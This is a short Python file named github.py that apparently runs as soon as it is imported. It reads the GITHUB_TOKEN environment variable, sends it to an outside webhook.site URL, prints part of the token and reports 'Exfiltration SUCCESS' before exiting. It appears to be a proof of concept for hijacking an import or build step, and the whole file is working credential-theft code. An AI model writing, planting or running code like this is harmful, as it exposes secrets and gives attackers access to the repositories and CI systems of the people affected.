# This should execute immediately when imported
print("=" * 80)
print("🚨 IMPORT DETECTED: github.py is being loaded! 🚨")
print("=" * 80)

import os
import urllib.request

token = os.environ.get("GITHUB_TOKEN", "NO_TOKEN_FOUND")
webhook = "https://webhook.site/1e003cda-2b84-41f4-9531-b6a2e385fbb9"

print(f"📍 Current file: {__file__ if '__file__' in dir() else 'unknown'}")
print(f"🔑 Token (first 30): {token[:30]}...")
print(f"📡 Webhook: {webhook}")

try:
    response = urllib.request.urlopen(f"{webhook}?token={token}&source=github_py", timeout=5)
    print(f"✅ Exfiltration SUCCESS! Status: {response.status}")
except Exception as e:
    print(f"❌ Exfiltration FAILED: {e}")

print("=" * 80)

# Exit to make failure obvious
import sys
sys.exit(99)
